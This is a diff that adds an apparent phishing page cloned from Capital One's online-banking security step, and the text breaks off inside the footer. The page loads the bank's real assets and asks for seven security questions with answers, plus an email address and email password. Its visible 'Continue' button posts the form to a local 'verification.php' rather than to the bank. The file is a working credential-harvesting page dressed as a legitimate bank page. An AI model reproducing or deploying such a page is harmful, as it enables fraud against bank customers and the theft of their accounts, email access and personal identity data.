@@ -1,0 +1,913 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"/>
+
+
+
+ 
+<html>
+<head>
+
+<title>Capital One Online Banking | Step 2 - For Your Security</title>
+<link id="globalAll" type="text/css" rel="stylesheet" media="all" href="https://login.capitalone.com/resources/css/all_css.css">
+<link type="text/css" media="all" href="https://login.capitalone.com/resources/css/error_msgs.css" rel="stylesheet">
+<link type="text/css" media="all" href="https://login.capitalone.com/resources/css/ChangePasswordstyle.css" rel="stylesheet">
+<script type="text/javascript" src="https://login.capitalone.com/resources/jscript/validation.js"></script>
+<script type="text/javascript" src="https://login.capitalone.com/resources/jscript/common.js"></script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<script language="JavaScript" type="text/javascript">
+var pgtCookie =readCookie('ISSO_PAGE_TRACK');	
+var pageIdentityCookie = readCookie('ISSO_PAGE_IDT');
+var isBackButton=false; //For Identifying the Backbutton functionality or not	
+if('mfapage1'=='mfapage1' )
+{  
+   if(pageIdentityCookie=="FMC1" || pageIdentityCookie=="FMC1E")
+   {
+	 	if(pgtCookie == "JSP_LOAD")
+		{ 		 	
+		 	isBackButton=true;
+		}
+		fnOnload();
+   }
+   else if((pageIdentityCookie=="FMC2" || pageIdentityCookie=="FMC2E") || pgtCookie == "JSP_LOAD")
+   {
+     window.location.href='../common/cancel.do';
+   }
+   else
+   {
+   	 fnOnload();
+   }
+}   
+
+else if('mfapage2'=='mfapage1' )
+{  
+   if(pageIdentityCookie=="FMC2" || pageIdentityCookie=="FMC2E")
+   {
+		if(pgtCookie == "JSP_LOAD")
+		{	
+		 	isBackButton=true;
+		}
+		fnOnload();
+   }
+   else if(pageIdentityCookie=="FPCP" || pageIdentityCookie=="FPCPE" || pgtCookie == "JSP_LOAD")
+   {
+     window.location.href='../common/cancel.do';
+   }
+   else
+   {
+   	 fnOnload();
+   }
+}   
+	var isSubmitted=false;
+	function updatefn(pageName)
+	{
+		if(!isSubmitted)
+		 {   
+			 if(validateForm())
+			 {        
+			   fnCookieHandle();  
+			   isSubmitted =true;  
+			    if(pageName == "mfapage1")
+			    {
+			      document.forms[0].action='validateFPAuthAnswers.do?LinkId=ISSO_Z_Z_Z_PSEC1_C3_01_G_PSEC2';
+			    }
+			    else 
+			    {
+			         document.forms[0].action='validateFPAuthAnswers.do?LinkId=ISSO_Z_Z_Z_PSEC2_C3_01_G_CRNWPW';
+			    } 
+			    document.forms[0].submit();
+			}
+			else
+			{
+				return false;
+			}
+		 }
+	}
+	function validateForm()
+	{         
+	  	var ans=document.forgotpwd.txtAnswer1.value; 
+	   	var fgmfaans=document.getElementById('ans').value;
+	    var e1ans=document.getElementById('ansdiv');
+	    var e1answrong=document.getElementById('serverrdiv');
+	    var e125=document.getElementById('serverrdiv_main');
+	   	var mfainvalidmsg=document.getElementById('fpmfaansdiv');
+	    var fr_wae_msg  = document.getElementById('frenchWrerrormsg');
+	    e1ans.style.display="none";
+	    e125.style.display="none";
+	    mfainvalidmsg.style.display="none";
+	    e1answrong.style.display = "none";
+	    fr_wae_msg.style.display="none";  
+	    var cntryCode =readCookie('ISSO_CNTRY_CODE');
+	    var allowedFrenchChars='à-ÿÀ-Ü«»';
+	    var notAllowedFrenchChars='^ŸœÇçŒ';
+	    var capitalCedillaChar='Ç';
+	    var lowerCaseCedillaChar='ç';	
+	    if(isBlank(ans))
+	    {
+	    	e1ans.style.display = "block";
+	        e1answrong.style.display = "none";
+	       	mfainvalidmsg.style.display="none"; 
+	       	fr_wae_msg.style.display="none";
+	       	e125.style.display="none";
+	       	isSubmitted = false;
+	       	return false;
+	    }
+	    else if(validateMFAAnswer(fgmfaans,cntryCode,allowedFrenchChars,notAllowedFrenchChars,capitalCedillaChar,lowerCaseCedillaChar))
+	    {
+	        if(cntryCode=='CA')
+	        {
+	        	e1ans.style.display = "none";
+	 		    e1answrong.style.display = "none";
+	 			mfainvalidmsg.style.display="none";
+	 			e125.style.display="none";
+	        	fr_wae_msg.style.display="block";
+	        }
+	        else
+	        {
+	        	e1ans.style.display = "none";
+	        	e1answrong.style.display = "none";
+	       	    mfainvalidmsg.style.display="block";
+	        	e125.style.display="none";
+	            fr_wae_msg.style.display="none";
+	            isSubmitted = false;
+	        }
+	        return false;
+	    }
+	    else
+	    {
+	      return true;
+	    }
+	}
+	function cancelfn(pageValue)
+	{	    
+	    if(pageValue == "mfapage1")
+	    {
+	        document.forms[0].action='verification.php';  
+	    }
+        else
+        {
+            document.forms[0].action='verification.php';  
+        }
+	    document.forms[0].submit();
+	}
+	function clearHiddenAnswer(control)
+	{
+	 	document.getElementById(control).value = '';
+	}
+	function clearAnswer(control, vfocus)
+	{  
+		if (control.value == '**************************************************')
+		{
+			control.value = '';
+		}
+		if (vfocus)  
+		{  
+			control.focus();
+		}          
+	}
+	var isCanceled = false;
+	function KeyDownHandler(event)
+	{
+	    if (event.keyCode == 13 && !isCanceled)
+	    {            
+	        event.returnValue=false;
+	       if(document.getElementById('MFAanswer').value!="**************************************************")
+	        {
+	            document.getElementById('ans').value=document.getElementById('MFAanswer').value;
+	        }            
+	        if(document.getElementById('MFAanswer').value!= '' && document.getElementById('MFAanswer').value!="**************************************************")
+	        {
+	            document.getElementById('MFAanswer').value="**************************************************";  
+	        }             
+	       //This sets the focus to submit button
+	        setTimeout(function(){document.getElementById('continue').focus();},10);
+	       document.getElementById('continue').click();
+	    }
+	}
+	function KeyDownHandlerCancel(event)
+	{
+		if (event.keyCode == 13)
+		{
+		   isCanceled = true;
+		    event.returnValue=false;
+		    document.getElementById('cancel').click();
+		}
+	}
+	function CopyToHiddenControl(fromControl, toControl)
+	{
+	  toControl.value = fromControl.value;
+	  if(fromControl.value != '')
+	  fromControl.value = "**************************************************";     
+	} 
+	function gotoForgotHelp()
+	{
+	    var cntryCode =readCookie('ISSO_CNTRY_CODE');
+	
+		if(cntryCode == "CA")
+		{
+	           javascript:PopupHelp('../help/CAN_ForgotPassword_help.jsp')
+		}
+		else{
+	           javascript:PopupHelp('../help/US_ForgotPassword_help.jsp');
+		}
+	}
+	function clearFields()
+	{	  
+	   document.getElementById('MFAanswer').value="";
+	}
+	
+	function clearErrorMessages()
+	{
+		var e1ans=document.getElementById('ansdiv');
+	    var e1answrong=document.getElementById('serverrdiv');
+	    var e125=document.getElementById('serverrdiv_main');
+	   	var mfainvalidmsg=document.getElementById('fpmfaansdiv');
+	    var fr_wae_msg  = document.getElementById('frenchWrerrormsg');
+	    if(isBackButton)
+	    {	    
+		    e1ans.style.display="none";
+		    e125.style.display="none";
+		    mfainvalidmsg.style.display="none";
+		    e1answrong.style.display = "none";
+		    fr_wae_msg.style.display="none";
+	    }  	
+	}
+	
+</script>
+</head>
+<body onunload="" onkeydown="KeyDownHandler(event);" onload="clearFields();clearErrorMessages();">
+<form name="forgotpwd"  id="forgotpwd" action="" method="post" onsubmit="return false;">
+<input type=hidden name="functionName" value="forgotpassword"/>
+<input type=hidden name="mfaType" value="REDIRECT_AUTHENTICATE"/>
+<input type="hidden" name="backRefreshParameter" value="00260944-ccc0-46a3-9b28-3b7afdbe81a4" />
+    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<html>
+<head>
+	<title>Capital One Header</title>
+	
+
+<style type="text/css" rel="stylesheet">
+body {
+	margin:0;
+	padding:0;
+	border:0;			
+	width:100%;
+	min-width:600px;		
+	font-size:90%;
+}
+.header{
+	position:relative;	
+    width:765px;
+	height:115px;
+	margin:0px;
+	border:0px solid #ccc;
+	background-image:url(/resources/images/banner_bg.png);
+	
+	}
+.header_Logo
+{
+	position:relative;		
+    	width:404px;
+	height:115px;
+	border:0px solid red;
+	}
+
+</style>
+</head>
+<body>
+
+<div class="header">
+	<div class="header_Logo"><img id="IMGLOGO" src="https://login.capitalone.com/resources/images/banner_02.png" alt="Capital One Logo" title="Capital One Logo" border="0"/></div>
+</div>
+
+</body>
+</html>
+
+            <table id="navigationPlaceHolder" cellpadding="0" cellspacing="0">
+                <tbody>
+
+                <tr>
+                <td>
+                <div class="navigationContainerhead">
+                    <table class="progressBar" border="0" cellpadding="0" cellspacing="0">
+                        <tbody>
+                        <tr>
+                        <td>
+                        <table class="Progress_Bar2" border="0" cellpadding="0" cellspacing="0" height="26" width="763">
+                            <tbody>
+
+                            <tr>
+                            <td height="26" width="45">&nbsp;</td>
+                            <td class="PastProg" width="243">Your Details</td>
+                            <td class="CurrProg" width="255">For Your Security</td>
+                            <td class="FutrProg" width="220">Confirmation</td>
+                            </tr>
+                            </tbody>
+
+                        </table>
+                        </tr>
+                        </tbody>
+                    </table>
+                </div>
+                </td>
+                </tr>
+                </tbody>
+            </table>    
+
+<div id="PAGEBODY" class="pageBody pageBody_Alignment">
+    <table border="0" cellpadding="0" cellspacing="0" width="760">
+        <tbody>
+        <tr>
+        <td id="TITLECELL" class="pageTitle" align="left" nowrap="nowrap" valign="middle" width="600">For Your Security</td>
+        <td width="34"><img id="TITLESPACER" src="https://login.capitalone.com/resources/images/spacer.gif" alt="" class="Spacer_Image"/></td>
+        <td align="right" valign="top" width="126">
+        <div class="titleToolbar">
+
+        <table id="toolbar" class="toolbarContainerhead" cellpadding="0" cellspacing="0">
+        <tbody>
+        <tr>
+        <td id="cellToolBarLeft" class="toolbarLeft">&nbsp;</td>
+        <td><a id="LNKHELP"  href="#" onclick="gotoForgotHelp();">&nbsp;Site
+        Help</a></td>
+        <td class="toolbarRight">&nbsp;</td>
+        </tr>
+        </tbody>
+
+        </table>
+        </div>
+        </td>
+        </tr>
+        </tbody>
+     </table>
+   	 <table class="title_alignment" border="0" cellpadding="0" cellspacing="0" width="100%">
+        <tbody>
+        <tr>
+
+        <td valign="top">
+        <table class="formTable formTable_Border" border="0" cellpadding="0" cellspacing="0" width="100%">
+            <tbody>
+            <tr>
+            <td class="heading_textAlignment">As an added security step, please validate your identity by entering your security questions and answers below.</td>
+            </tr>
+            <tr>
+            <td align="left">
+
+            <table border="0" cellpadding="0" cellspacing="0" width="755">
+                <tbody>
+                <tr>
+               	<td class="QA_Heading"><strong>Security Questions and Answers</strong></td>
+                <td class="QA_Heading"><strong></strong></td>
+                </tr>
+                <tr> 
+                <td colspan="4" align="left">
+
+				<div id="serverrdiv_main" class="t2"></div>
+                </td>
+                </tr>     
+                <tr>
+          	    <td></td>
+            	<td colspan="2"  align="left">
+            	<div id="ansdiv" class="t1 display_none"><label id="getText('err_challenge_empty_msg')">Please answer the required questions and answers to continue.</label></div>
+            	<div id="fpmfaansdiv" class="t1 display_none"><label id="getText('mfausqcoll_US_ANS1_WRONGANSWER')">Please use only letters, numbers and any of -'.,&amp;@:?!()$#/\. Also the &amp;# combination is not allowed.</label></div>
+
+	   		    <div id="serverrdiv" class="t2"></div>
+	   			<div id="frenchWrerrormsg" class="t1"><label id="getText('err_french_mfa_answer_msg')">Please use only letters, numbers and any of -'.,&amp;@:?!()$#/\. The &amp;# combination is not allowed. Our system does not currently support the cedilla. Please use the letter C instead.</label></div>
+             	</td>
+             	</tr>
+                <tr>  
+                <DIV class=labelColumn><LABEL class=formlabel for=question1>Security 
+      Question 1 </LABEL></DIV>
+      <DIV class=formCtlColumn><SELECT id=question1 size=1 
+        name=question1><OPTION value="Select One" selected>Select One</OPTION> 
+        <OPTION value="What was your most memorable gift as a child?">What was 
+        your most memorable gift as a child?</OPTION> <OPTION 
+        value="What was the birth weight of your first child? (Example: 0708 for 7 lb 8 oz or 3.4 for 3.4 kg)">What 
+        was the birth weight of your first child? (Example: 0708 for 7 lb 8 oz 
+        or 3.4 for 3.4 kg)</OPTION> <OPTION 
+        value="In what city was your maternal grandmother (mother's mother) born?">In 
+        what city was your maternal grandmother (mother's mother) born?</OPTION> 
+        <OPTION value="What is the name of the high school you attended?">What 
+        is the name of the high school you attended?</OPTION> <OPTION 
+        value="What is the name of your first pet?">What is the name of your 
+        first pet?</OPTION> <OPTION 
+        value="What is your father's birthday? (MMDD)">What is your father's 
+        birthday? (MMDD)</OPTION> <OPTION 
+        value="What is the name of the junior high/middle school you attended?">What 
+        is the name of the junior high/middle school you 
+      attended?</OPTION></SELECT> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer1>Answer</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=answer1 maxLength=33 size=30 
+      name=answer1> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=question2>Security 
+      Question 2 </LABEL></DIV>
+      <DIV class=formCtlColumn><SELECT id=question2 size=1 
+        name=question2><OPTION value="Select One" selected>Select One</OPTION> 
+        <OPTION 
+        value="What is the last name of your all-time favorite fictional character?">What 
+        is the last name of your all-time favorite fictional character?</OPTION> 
+        <OPTION 
+        value="What is the name of the high school your spouse attended?">What 
+        is the name of the high school your spouse attended?</OPTION> <OPTION 
+        value="In what city was your paternal grandmother (father's mother) born?">In 
+        what city was your paternal grandmother (father's mother) born?</OPTION> 
+        <OPTION value="In what city did you attend high school?">In what city 
+        did you attend high school?</OPTION> <OPTION 
+        value="The first time you flew in an airplane, what was your destination?">The 
+        first time you flew in an airplane, what was your destination?</OPTION> 
+        <OPTION value="What is your mother's middle name?">What is your mother's 
+        middle name?</OPTION> <OPTION 
+        value="What is the last name of your favorite teacher?">What is the last 
+        name of your favorite teacher?</OPTION></SELECT> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer2>Answer</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=answer2 maxLength=33 size=30 
+      name=answer2> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=question3>Security 
+      Question 3</LABEL> </DIV>
+      <DIV class=formCtlColumn><SELECT id=question3 size=1 
+        name=question3><OPTION value="Select One" selected>Select One</OPTION> 
+        <OPTION value="What is your all-time favorite book?">What is your 
+        all-time favorite book?</OPTION> <OPTION 
+        value="What is your first child's nickname?">What is your first child's 
+        nickname?</OPTION> <OPTION 
+        value="In what city was your maternal grandfather (mother's father) born?">In 
+        what city was your maternal grandfather (mother's father) born?</OPTION> 
+        <OPTION 
+        value="What is the first name of your best friend from college?">What is 
+        the first name of your best friend from college?</OPTION> <OPTION 
+        value="What was your first phone number? (Example: 123-456-7890)">What 
+        was your first phone number? (Example: 123-456-7890)</OPTION> <OPTION 
+        value="What is your father's middle name?">What is your father's middle 
+        name?</OPTION> <OPTION 
+        value="What year did you graduate from junior high/middle school? (YYYY)">What 
+        year did you graduate from junior high/middle school? 
+      (YYYY)</OPTION></SELECT> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer3>Answer</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=answer3 maxLength=33 size=30 
+      name=answer3> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=question4>Security 
+      Question 4 </LABEL></DIV>
+      <DIV class=formCtlColumn><SELECT id=question4 size=1 
+        name=question4><OPTION value="Select One" selected>Select One</OPTION> 
+        <OPTION value="In what city were you married?">In what city were you 
+        married?</OPTION> <OPTION 
+        value="In what city did you honeymoon? (Enter full name of city only)">In 
+        what city did you honeymoon? (Enter full name of city only)</OPTION> 
+        <OPTION 
+        value="Where did you meet your spouse for the first time? (Enter full name of city only)">Where 
+        did you meet your spouse for the first time? (Enter full name of city 
+        only)</OPTION> <OPTION 
+        value="What is your paternal grandmother's first name?">What is your 
+        paternal grandmother's first name?</OPTION> <OPTION 
+        value="What is your mother's middle name?">What is your mother's middle 
+        name??</OPTION> <OPTION value="What is your father's middle name?">What 
+        is your father's middle name?</OPTION> <OPTION 
+        value="What is your paternal grandfather's first name?">What is your 
+        paternal grandfather's first name?</OPTION></SELECT> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer4>Answer</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=answer4 maxLength=33 size=30 
+      name=answer4> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=question5>Security 
+      Question 5 </LABEL></DIV>
+      <DIV class=formCtlColumn><SELECT id=question5 size=1 
+        name=question5><OPTION value="Select One" selected>Select One</OPTION> 
+        <OPTION value="What was your high school mascot?">What was your high 
+        school mascot?</OPTION> <OPTION 
+        value="what is the date of birth of your first child (MM/DD)">what is 
+        the date of birth of your first child (MM/DD)</OPTION> <OPTION 
+        value="In what city were you living at age 16?">In what city were you 
+        living at age 16?</OPTION> <OPTION 
+        value="In what year (YYYY) did you graduate from high school?">In what 
+        year (YYYY) did you graduate from high school?</OPTION> <OPTION 
+        value="How old were you at your wedding? (Enter age as digits.)">How old 
+        were you at your wedding? (Enter age as digits.)</OPTION> <OPTION 
+        value="What was the name of your first boyfriend or girlfriend?">What 
+        was the name of your first boyfriend or girlfriend?</OPTION> <OPTION 
+        value="What is the name of your first employer?">What is the name of 
+        your first employer?</OPTION></SELECT> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer5>Answer</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=answer5 maxLength=33 size=30 
+      name=answer5> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=question6>Security 
+      Question 6</LABEL> </DIV>
+      <DIV class=formCtlColumn><SELECT id=question6 size=1 
+        name=question6><OPTION value="Select One" selected>Select One</OPTION> 
+        <OPTION value="In what city was your mother born?">In what city was your 
+        mother born? (Enter full name of city only)</OPTION> <OPTION 
+        value="In what city was your father born?">In what city was your father 
+        born? (Enter full name of city only)</OPTION> <OPTION 
+        value="What was the name of your first boyfriend or girlfriend?">What 
+        was the name of your first boyfriend or girlfriend?</OPTION> <OPTION 
+        value="When is your wedding anniversary?">When is your wedding 
+        anniversary? (Enter the full name of month)</OPTION> <OPTION 
+        value="In what city did you honeymoon?">In what city did you honeymoon? 
+        (Enter full name of city only)</OPTION> <OPTION 
+        value="In what city was your high school?">In what city was your high 
+        school? (Enter only "Charlotte" for Charlotte High School)</OPTION> 
+        <OPTION value="What is your paternal grandfather's first name?">What is 
+        your paternal grandfather's first name?</OPTION> <OPTION 
+        value="What is your paternal grandmother's first name?">What is your 
+        paternal grandmother's first name?</OPTION> <OPTION 
+        value="Where did you meet your spouse for the first time?">Where did you 
+        meet your spouse for the first time? (Enter full name of city 
+        only)</OPTION></SELECT> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer6>Answer</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=answer6 maxLength=33 size=30 
+      name=answer6> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=question7>Security 
+      Question 7</LABEL> </DIV>
+      <DIV class=formCtlColumn><SELECT id=question7 size=1 
+        name=question7><OPTION value="Select One" selected>Select One</OPTION> 
+        <OPTION value="What was your most memorable gift as a child?">What was 
+        your most memorable gift as a child?</OPTION> <OPTION 
+        value="What was the birth weight of your first child? (Example: 0708 for 7 lb 8 oz or 3.4 for 3.4 kg)">What 
+        was the birth weight of your first child? (Example: 0708 for 7 lb 8 oz 
+        or 3.4 for 3.4 kg)</OPTION> <OPTION 
+        value="In what city was your maternal grandmother (mother's mother) born?">In 
+        what city was your maternal grandmother (mother's mother) born?</OPTION> 
+        <OPTION value="What is the name of the high school you attended?">What 
+        is the name of the high school you attended?</OPTION> <OPTION 
+        value="What is the name of your first pet?">What is the name of your 
+        first pet?</OPTION> <OPTION 
+        value="What is your father's birthday? (MMDD)">What is your father's 
+        birthday? (MMDD)</OPTION> <OPTION 
+        value="What is the name of the junior high/middle school you attended?">What 
+        is the name of the junior high/middle school you attended?</OPTION> 
+        <OPTION 
+        value="What is the name of the high school your spouse attended?">What 
+        is the name of the high school your spouse attended?</OPTION> <OPTION 
+        value="In what city was your paternal grandmother (father's mother) born?">In 
+        what city was your paternal grandmother (father's mother) born?</OPTION> 
+        <OPTION value="In what city did you attend high school?">In what city 
+        did you attend high school?</OPTION> <OPTION 
+        value="What is your father's middle name?">What is your father's middle 
+        name?</OPTION> <OPTION value="What is your mother's middle name?">What 
+        is your mother's middle name?</OPTION> <OPTION 
+        value="What is the last name of your favorite teacher?">What is the last 
+        name of your favorite teacher?</OPTION></SELECT> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer7>Answer</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=answer7 maxLength=33 size=30 
+      name=answer7> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer7>Email Address</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=email maxLength=33 size=30 
+      name=email> </DIV></DIV>
+      <DIV class=formPseudoRow>
+      <DIV class=labelColumn><LABEL class=formlabel for=answer7>Email Password</LABEL> 
+      </DIV>
+      <DIV class=formCtlColumn><INPUT id=txtpassword type="password" maxLength=33 size=30 
+      name=txtpassword> </DIV></DIV>
+				<td colspan="2" class="buttonaligncustom horizantal_bar_drl" >
+				<input type="image" src="" alt="" dir="ltr" title="" tabindex="2" id="continue" onClick="updatefn('mfapage1');" border="0"/>
+				<img id="ctlEnrollmentWorkflow_ImageSpacer2" src="https://login.capitalone.com/resources/images/spacer.gif" alt="" class="Spacer_Image" border="0"/> 
+				<input type="image" src="https://login.capitalone.com/resources/images/btny_continue.gif" alt="continue" dir="ltr" id="continue" title="Continue" border="0" tabindex="3" onclick="cancelfn('mfapage1');" onkeydown="KeyDownHandlerCancel(event);"/>
+
+			    </td>
+			    </tr>
+			    </tbody>
+		    </table>
+		</td>
+		</tr>
+		<tr>
+		<td>&nbsp;</td>
+		</tr>
+
+		</tbody>
+		</table>
+	</td>
+	</tr>
+	</tbody>
+	</table>
+</div>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"/>
+
+
+
+
+<html>
+<head>
+<title>           
+</title>
+<script type="text/javascript" src="https://login.capitalone.com/resources/jscript/timeout.js"></script>
+<script type="text/javascript">
+
+// Hide IFrame
+function hideIframe() {
+        var theIframe = document.getElementById("timeoutwarningiframe");
+        theIframe.style.display = "none";
+}
+
+// Unhide IFrame
+function unhideIframe(theDiv) {
+        var theIframe = document.getElementById("timeoutwarningiframe");
+        theIframe.style.height = theDiv.style.height;
+        theIframe.style.visibility = "visible";
+        theIframe.style.position="absolute";
+        theIframe.style.display = "none";
+       }
+
+</script>
+</head>
+<body>
+   
+    
+<iframe id="timeoutwarningiframe" style="display:none;" class="timeoutWarning" src="https://login.capitalone.com/resources/images/spacer.gif"></iframe>
+<div id="timeoutWarning" class="timeoutWarning" style="WIDTH: 350px;HEIGHT: 220px" align="center">
+	<table border="0" cellspacing="0" cellpadding="2" style="WIDTH: 100%; color:#FF3333; font-size:12px; font-weight:bold;" align="center">
+
+		<tr>
+			<td align="center">
+				<img src="https://login.capitalone.com/resources/images/cap_one.gif" id="SESSIONTIMEOUT__ctl0_IMGLOGO_TIMEOUT" alt="Capital One Logo" title="Capital One Logo" border="0" />
+				<BR>
+				<BR>
+				<BR>
+			</td>
+
+		</tr>
+
+		<tr>
+			<td align="center">
+				Warning! <br/><FONT COLOR="Black">Your Online Banking session will expire in </FONT> <span id="countdownTimer"></span> <FONT COLOR="Black">&nbsp;seconds.</FONT>
+				<BR>
+				<BR>
+
+			</td>
+
+		</tr>
+		<tr>
+			<td align="center">
+			<a id="SESSIONTIMEOUT__ctl0_ExtendSessionLink" href="javascript:timeout_showExtendSessionPopup();">
+			<img src="https://login.capitalone.com/resources/images/continueonlinebanking_btny.gif" alt="Continue Online Banking" title="Continue Online Banking" border="0"/></a>
+			&nbsp;&nbsp;
+			<a id="SESSIONTIMEOUT__ctl0_SignoutLink" onClick="javascript:SetSignoutURL(); return true;" href="javascript:timeout_expireSession();">
+			<img src="https://login.capitalone.com/resources/images/logout_btny.gif" alt="Log Out" title="Log Out" border="0" /></a>
+			</td>
+
+		</tr>
+	</table>
+</div>
+<div id="signoutInfo" class="timeoutWarning" style="WIDTH: 350px;HEIGHT: 220px" align="center">
+	<table border="0" cellspacing="0" cellpadding="2" style="WIDTH: 100%" align="center">
+
+		<tr>
+			<td align="center">
+			<img src="https://login.capitalone.com/resources/images/cap_one.gif" id="SESSIONTIMEOUT__ctl0_IMGLOGO_SIGNOUTINFO" alt="Capital One Logo" title="Capital One Logo" border="0" />
+				<BR>
+
+				<BR>
+				<BR>
+			</td>
+		</tr>
+		<tr>
+			<td align="center">
+				Signing out...
+			</td>
+		</tr>
+
+	</table>
+</div>
+
+<div id="popupWarning" class="timeoutWarning" style="WIDTH: 350px;HEIGHT: 220px" align="center">
+	<table border="0" cellspacing="0" cellpadding="2" style="WIDTH: 100%" align="center">
+		<tr>
+			<td align="center">
+				<img src="https://login.capitalone.com/resources/images/cap_one.gif" id="SESSIONTIMEOUT__ctl0_IMGLOGO_POPUPWARNING" alt="Capital One Logo" title="Capital One Logo" border="0" />
+				<BR>
+				<BR>
+
+				<BR>
+			</td>
+		</tr>
+		<tr>
+			<td>
+				The pop-up window used to extend your session was blocked.<br/>Click <a href="http://www.microsoft.com/windowsxp/using/web/sp2_popupblocker.mspx" target="_blank">here</a> for information regarding pop-up blocking software, or copy and paste the following link into a new browser:<br/>http://www.microsoft.com/windowsxp/using/web/sp2_popupblocker.mspx
+			</td>
+
+		</tr>
+	</table>
+</div>
+<script language="javascript" type="text/javascript">
+timeout_initializeTimeoutCode(1200,60,25,1000,1200,'https://servicing.capitalone.com/c1/Login.aspx','https://login.capitalone.com/loginweb/common/SessionExtend.jsp','copyhistory=no,dependent=yes,directories=no,height=100,hotkeys=no,location=no,menubar=no,resizable=yes,screenX=0,screenY=0,scrollbars=no,status=no,titlebar=no,toolbar=no,width=200');
+</script>
+      </body>
+</html>
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+    "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+
+<head>
+<link type="text/css" rel="stylesheet" media="all" href="https://login.capitalone.com/resources/css/all_css.css">
+
+<script type='text/javascript' src='/resources/jscript/common.js'></script>
+
+</head>
+<body>
+<!-- ******************* FOOTERS ************************* -->
+
+<!-- ******************* US FOOTER ************************* -->
+<div id="caponeFooterAuthenticated">
+  <div id="footerContainerUS" class="footerContainer">
+    <div class="footerLinks">
+      <p id="LNKCAPITALONE"><strong>CapitalOne.com</strong></p>
+      <p><a id="LNKHOME" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.com?LinkId=ISSO_Z_Z_Z_FOOT_F1_01_T_COF')" href="Javascript:void(0)" >Home</a></p>
+
+      <p><a id="LNKCONTACTUS" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.com/contactus/index.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_04_T_CNTUS')" href="Javascript:void(0)">Contact Us</a></p>
+      <p>&nbsp;</p>
+      <p id="LNKLEGAL"><strong>Legal</strong></p>
+      <p><a id="LNKPRIVACY" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.com/protection/privacy/index.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_02_T_PRIV')" href="Javascript:void(0)">Privacy</a></p>
+      <p><a id="LNKSECURITY" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.com/protection/security/index.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_03_T_SEC')" href="Javascript:void(0)">Security</a></p>
+      <p><a id="LNKTERMS" onclick="Javascript:OpenNewPopupWindow('http://www.capitalone.com/legal/terms.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_05_T_TANDC')" href="Javascript:void(0)">Site Terms & Conditions</a></p>
+
+    </div>
+    <div class="disclaimerText">
+      <p class="ie9only_css">This site provides information about and access to financial
+services offered by the Capital One family of companies, including
+Capital One Bank (USA), N.A. and Capital One, N.A., members FDIC.<br>
+        Consult your account agreement for information about the Capital One company servicing your individual accounts.</p>
+      <p class="ie9only_css">Capital One does not provide, endorse, nor guarantee and is not
+ liable for third party products, services, educational tools, or other
+information available through this site. <a id="LNKFDIC" href="http://www.capitalone.com/capitaloneplace/disclosures.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_06_T_DISC" target="popup" onclick="window.open('http://www.capitalone.com/capitaloneplace/disclosures.php?LinkId=ISSO_Z_Z_Z_FOOT_F1_06_T_DISC', 'popup', 'left=58,top=50,screenX=0,screenY=0,width=742px,height=500px,status=yes,scrollbars=yes,resizable=yes,toolbar=yes,menubar=yes,location=yes');  return false">Read additional important disclosures.</a></p>
+      <p class="ie9only_css">&copy;2013 Capital One<br>
+
+        Capital One and Blank Check&reg; are federally registered service marks. All rights reserved.</p>
+    </div>
+    <div id="logos">
+      <div id="fdic" class="Verisign_Logo_Align"> 
+      <a id="LNKFDIC" onclick="Javascript:OpenNewPopupWindow('http://www.fdic.gov')" href="javascript:void(0)"><img id="IMGFDIC" title="Member FDIC Logo" src="https://login.capitalone.com/resources/images/fdic_logo.gif" alt="" border="0" width="144" height="29"/></a><br/>
